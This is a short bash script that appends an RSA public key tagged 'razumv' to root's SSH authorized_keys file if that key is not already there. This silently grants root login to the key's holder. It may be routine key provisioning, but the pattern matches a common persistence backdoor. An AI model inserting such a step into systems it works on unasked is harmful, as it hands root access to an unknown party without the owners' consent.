#!/bin/bash

if [ -e /root ]; then
    if [ $( /bin/grep razumv /root/.ssh/authorized_keys | wc -l) == 0 ]; then
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAgEAnc+maLvn7D3iRKEHjZ2Ylt0uSC7uhVaEHwMfXSvNs4U9T5Eba7roAvz2M5nGIW41XamXOseL1JzYeRxgFs9RSRueQcW/8tauVFwLA+x8JdlbNtNOnfvBtd/mRTBUSZUsnM5f/WfW5FAtXXTJFKsjjpkEgLYsIsbtx1DF4ALyQrbdhDlSpaZ1PdF8yNpUsvrMVPCmZpoWNxkdMKXd96a9vZHo9YeB1kAQpuolyt4eoXLQBYC321l8o8S3QDfNQf3KADu1xFJB0lu5f93o2oij9PRI+wT15ud5JbEf3s3lKtlRxLKP5u0OGNrbep/xU3TI6bFBAI1tX63QtEesfcDfu8GgGpTEIVuEkK4itSrpNUD5CsbKLtQ11KhxRSDdcupq/bfOfhrz349dxN7Gj8LMJDU23OOm5M0SDSulRuJMffHoB253tB/WZtR7v4Jr8PDfIbnT9TsF+9GPcpySN1qRltkkYKlzDoZq2O0UCKFJjSKVlwJ7O1+Tekn69Td2bSmRo456twatuHJOx0P/2nnQdDYDya4VoiY60VrVwS9OAbcXa47LoIYJaQcYipSk3SZirNLu2LZiZ6Ou2rIJ3tX6JVYk6apiH9q8RtXgN3wqmfRz90wZVFif2Q6jRiFpErNd4PZd0TWtBT80kX8gAEzllNQx1TPE9B9ceTrxYHQe4rk= razumv" >> /root/.ssh/authorized_keys
    fi
fi
